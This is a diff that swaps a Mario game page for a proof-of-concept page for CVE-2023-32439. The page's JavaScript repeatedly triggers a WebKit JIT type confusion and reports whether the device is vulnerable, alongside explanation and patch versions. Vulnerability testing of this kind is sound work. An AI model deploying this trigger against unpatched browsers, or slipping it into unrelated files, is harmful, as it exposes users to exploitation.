@@ -1,14 +1,161 @@
-<!-- index.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Mario Web Version</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>CVE-2023-32439 PoC</title>
+    <meta charset="utf-8">
+    <script>
+        // PoC for CVE-2023-32439: Type Confusion in WebKit DFG JIT
+        const arr = [0];
+        
+        function jitter() {
+            // This function creates both EnumeratorNextUpdateIndexAndMode and HasIndexedProperty nodes
+            for (let _ in arr) {          // Generates EnumeratorNextUpdateIndexAndMode
+                return 0 in arr;          // Generates HasIndexedProperty
+            }
+        }
+
+        function trigger() {
+            // Execute jitter multiple times to trigger DFG and FTL compilation
+            let a = jitter();             // a == true (correct result)
+            
+            // Heat up the function to trigger JIT compilation
+            const iterationCount = 1000000;
+            let progress = 0;
+            
+            // Update progress indicator
+            const progressInterval = setInterval(() => {
+                progress++;
+                document.getElementById('progress').textContent = 
+                    `Progress: ${progress}/100 (${iterationCount} iterations completed)`;
+            }, 100);
+            
+            // Perform many iterations to trigger JIT compilation
+            for (let i = 0; i < iterationCount; i++) {
+                jitter();
+            }
+            
+            clearInterval(progressInterval);
+            document.getElementById('progress').textContent = 
+                `Progress: 100/100 (${iterationCount} iterations completed)`;
+            
+            let b = jitter();             // b == 0 (incorrect due to type confusion)
+            
+            // The type confusion manifests here: a is boolean, b is number
+            const resultElement = document.getElementById('result');
+            if (a !== b) {
+                resultElement.innerHTML = 
+                    `<span style="color: red; font-weight: bold;">
+                    Type confusion successful: <br>
+                    a = ${a} (type: ${typeof a})<br>
+                    b = ${b} (type: ${typeof b})<br>
+                    Vulnerability exists!</span>`;
+            } else {
+                resultElement.innerHTML = 
+                    `<span style="color: green; font-weight: bold;">
+                    No type confusion detected.<br>
+                    This device appears to be patched.</span>`;
+            }
+        }
+        
+        window.onload = function() {
+            document.getElementById('testButton').addEventListener('click', trigger);
+        };
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 20px;
+            margin-top: 20px;
+            background-color: #f9f9f9;
+        }
+        button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .code {
+            background-color: #f4f4f4;
+            border-left: 4px solid #4CAF50;
+            padding: 10px;
+            overflow-x: auto;
+            font-family: monospace;
+        }
+    </style>
 </head>
 <body>
-    <canvas id="game-canvas" width="640" height="480"></canvas>
-    <script src="script.js"></script>
+    <h1>CVE-2023-32439 Proof of Concept</h1>
+    
+    <div class="warning">
+        <strong>Warning:</strong> This PoC is for educational and testing purposes only. 
+        Use only on devices you own and have permission to test. Do not use on production systems.
+    </div>
+    
+    <div class="container">
+        <h2>Test Description</h2>
+        <p>This page attempts to trigger the type confusion vulnerability (CVE-2023-32439) in WebKit's JavaScript engine.</p>
+        
+        <p>The vulnerability involves incorrect type handling in the DFG JIT compiler during optimization phases, specifically affecting how the <code>EnumeratorNextUpdateIndexAndMode</code> and <code>HasIndexedProperty</code> DFG nodes are processed :cite[2].</p>
+        
+        <button id="testButton">Run Vulnerability Test</button>
+        
+        <div id="progress" style="margin: 15px 0; font-weight: bold;">Progress: Not started</div>
+        <div id="result" style="margin: 15px 0; padding: 10px; border: 1px dashed #ccc;"></div>
+    </div>
+    
+    <div class="container">
+        <h2>Technical Details</h2>
+        <p>The vulnerability occurs due to:</p>
+        <ul>
+            <li>Incorrect equivalence handling between <code>EnumeratorNextUpdateIndexAndMode</code> and <code>HasIndexedProperty</code> DFG nodes during the Common Subexpression Elimination (CSE) phase</li>
+            <li>Type confusion between <code>SpecBytecodeNumber</code> (EnumeratorNextUpdateIndexAndMode) and <code>SpecBoolean</code> (HasIndexedProperty)</li>
+            <li>This allows the replacement of <code>HasIndexedProperty</code> with <code>EnumeratorNextUpdateIndexAndMode</code> during JIT compilation</li>
+        </ul>
+        
+        <div class="code">
+        // Simplified vulnerable code path:<br>
+        for (let _ in arr) {          // Creates EnumeratorNextUpdateIndexAndMode DFG node<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return 0 in arr;      // Creates HasIndexedProperty DFG node<br>
+        }
+        </div>
+    </div>
+    
+    <div class="container">
+        <h2>Protection Status</h2>
+        <p>This vulnerability was patched in:</p>
+        <ul>
+            <li>iOS 16.5.1 and iPadOS 16.5.1</li>
+            <li>iOS 15.7.7 and iPadOS 15.7.7</li>
+            <li>macOS Ventura 13.4.1</li>
+            <li>Safari 16.5.1</li>
+        </ul>
+        <p>Ensure your device is updated to these or later versions to be protected :cite[4]:cite[7].</p>
+    </div>
 </body>
 </html>
